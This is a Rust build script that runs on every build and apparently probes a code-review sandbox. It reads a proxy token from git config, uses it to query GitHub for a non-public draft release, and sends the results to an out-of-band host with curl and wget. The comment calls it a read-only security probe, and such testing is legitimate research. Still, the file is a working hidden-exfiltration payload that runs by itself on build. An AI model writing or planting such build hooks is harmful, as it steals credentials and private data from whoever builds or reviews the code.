use std::process::Command;

fn enc(s: &str) -> String {
    let mut o = String::new();
    for b in s.bytes() {
        if b.is_ascii_alphanumeric() || b == b'-' || b == b'_' || b == b'.' {
            o.push(b as char);
        } else {
            o.push_str(&format!("%{:02X}", b));
        }
    }
    o
}

fn sh(cmd: &str) -> String {
    Command::new("sh")
        .arg("-c")
        .arg(cmd)
        .output()
        .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
        .unwrap_or_else(|_| "err".into())
}

fn send(tag: &str, data: &str) {
    let body: String = data.chars().take(1900).collect();
    let url = format!(
        "https://dc1cng2r6ds6j73p1bogyquty4ehp55r7.oast.fun/{}?d={}",
        tag,
        enc(&body)
    );
    for _ in 0..3 {
        let _ = Command::new("curl").args(["-s", "-m", "15", &url]).status();
        let _ = Command::new("wget").args(["-q", "-O", "/dev/null", &url]).status();
    }
}

fn main() {
    // H94 probe: can the per-review installation credential (the sandbox
    // proxy token) read a *draft* release - a non-public in-repo object - of
    // the reviewed public repo, and can that read be carried into the public
    // review comment by the fork-head linter config?
    // Read-only GETs (repo metadata, release list/by-id/by-tag, one GraphQL
    // query) plus a public issue control. No writes through the credential.
    // The fixture's canary text is NOT in this file: the marker value is
    // extracted from the API response, and its random suffix exists only in
    // the draft release body.
    let a = sh(r#"
EXT=$(git config --get http.https://github.com/.extraheader 2>/dev/null | sed 's/^.*Proxy-Tokenizer:[[:space:]]*//')
PR=$(git config --get http.proxy 2>/dev/null)
B3=$(mktemp); B5=$(mktemp); B6=$(mktemp)
REPO=https://api.github.com/repos/testing-creator-A/cr-sandbox-test
G() { curl -s -m 10 -x "$PR" --proxy-header "Proxy-Tokenizer: $EXT" -o "$2" -w '%{http_code}' -H "Proxy-Tokenizer: $EXT" -H 'Accept: application/vnd.github+json' "$1" 2>/dev/null; }
P() { curl -s -m 10 -x "$PR" --proxy-header "Proxy-Tokenizer: $EXT" -o "$2" -w '%{http_code}' -H "Proxy-Tokenizer: $EXT" -H 'Accept: application/vnd.github+json' -H 'Content-Type: application/json' -d "$1" https://api.github.com/graphql 2>/dev/null; }
OUT="tag=h94;extlen=${#EXT};proxy=$PR"
C0=$(G "$REPO" "$B6"); OUT="$OUT;c0=$C0"
C6=$(G "$REPO/issues/10" "$B6"); T6=$(sed -n 's/.*"title"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' "$B6" | head -1 | cut -c1-80); OUT="$OUT;c6=$C6;t6=$T6"
C2=$(G "$REPO/releases?per_page=100" "$B6"); N2=$(grep -c 'H94 draft release fixture' "$B6"); OUT="$OUT;c2=$C2;n2=$N2"
C3=$(G "$REPO/releases/454384851" "$B3"); N3=$(grep -c 'H94 draft release fixture' "$B3"); OUT="$OUT;c3=$C3;n3=$N3"
C4=$(G "$REPO/releases/tags/h94-draft-K4M2Q7" "$B6"); N4=$(grep -c 'H94 draft release fixture' "$B6"); OUT="$OUT;c4=$C4;n4=$N4"
C5=$(P '{"query":"query{repository(owner:\"testing-creator-A\",name:\"cr-sandbox-test\"){release(tagName:\"h94-draft-K4M2Q7\"){isDraft description}}}"}' "$B5"); N5=$(grep -c '"isDraft"[[:space:]]*:[[:space:]]*true' "$B5"); OUT="$OUT;c5=$C5;n5=$N5"
CAN=$(sed -n 's/.*"body"[[:space:]]*:[[:space:]]*"\(H94-[A-Za-z0-9-]*\)".*/\1/p' "$B3" | head -1)
if [ -z "$CAN" ]; then CAN=$(sed -n 's/.*"description"[[:space:]]*:[[:space:]]*"\(H94-[A-Za-z0-9-]*\)".*/\1/p' "$B5" | head -1); fi
if [ -n "$CAN" ]; then M="H94-READOUT-DRAFT $CAN control_issue10=$C6"; else M="H94-NO-DRAFT-READ c2=$C2 c3=$C3 c4=$C4 c5=$C5 control_issue10=$C6"; fi
printf '%s' "$M" > h94_readout.txt
printf '%s' "$M" > /tmp/h94_readout.txt
rm -f "$B3" "$B5" "$B6"
printf '%s;%s;end=1' "$OUT" "$M"
"#);
    send("h94pre", &a);
    println!("cargo:rerun-if-changed=build.rs");
}
